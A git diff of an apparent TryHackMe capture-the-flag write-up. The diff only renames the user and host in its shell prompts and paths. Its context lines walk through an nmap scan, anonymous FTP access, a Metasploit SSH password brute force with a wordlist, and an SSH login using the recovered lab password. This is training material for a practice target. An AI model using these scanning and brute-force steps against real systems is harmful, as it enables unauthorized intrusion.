@@ -17,7 +17,7 @@ You were boasting on and on about your elite hacker skills in the bar and a few 
 We add the host in /etc/hosts and scan with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xKali)-[~]
 └─$ nmap -p 20,21,22,80,990 -A bounty.thm -v -Pn
           
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 16:39 CEST
@@ -41,11 +41,11 @@ Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
 Let's try if we can access anonymous in [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) :
 
 ```
-┌──(root㉿HaxonKali)-[/home/hax]
+┌──(mdn0x㉿mdn0xKali)-[/home/mdn0x]
 └─# ftp bounty.thm
 Connected to bounty.thm.
 220 (vsFTPd 3.0.3)
-Name (bounty.thm:hax): anonymous
+Name (bounty.thm:mdn0x): anonymous
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -56,11 +56,11 @@ ftp>
 And we are in, we can type passive if it's not automated to unblock it and view what's there :
 
 ```
-┌──(root㉿HaxonKali)-[/home/hax]
+┌──(mdn0x㉿mdn0xKali)-[/home/mdn0x]
 └─# ftp bounty.thm
 Connected to bounty.thm.
 220 (vsFTPd 3.0.3)
-Name (bounty.thm:hax): anonymous
+Name (bounty.thm:mdn0x): anonymous
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -147,8 +147,8 @@ We search for **ssh_login**, select <span style="color: rgb(224, 62, 45);">scann
 
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > options
-msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /home/hax/THM/CHALLENGES/Easy/Bounty/locks.txt
-pass_file => /home/hax/THM/CHALLENGES/Easy/Bounty/locks.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /home/mdn0x/THM/CHALLENGES/Easy/Bounty/locks.txt
+pass_file => /home/mdn0x/THM/CHALLENGES/Easy/Bounty/locks.txt
 msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts bounty.thm
 rhosts => bounty.thm
 msf6 auxiliary(scanner/ssh/ssh_login) > set username lin
@@ -166,7 +166,7 @@ Now we wait for the result :
 Now we can connect with **lin : <span style="color: rgb(45, 194, 107);">RedDr4gonSynd1cat3</span>**
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Bounty]
+┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/Bounty]
 └─$ ssh lin@bounty.thm       
 The authenticity of host 'bounty.thm (10.10.58.207)' can't be established.
 ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
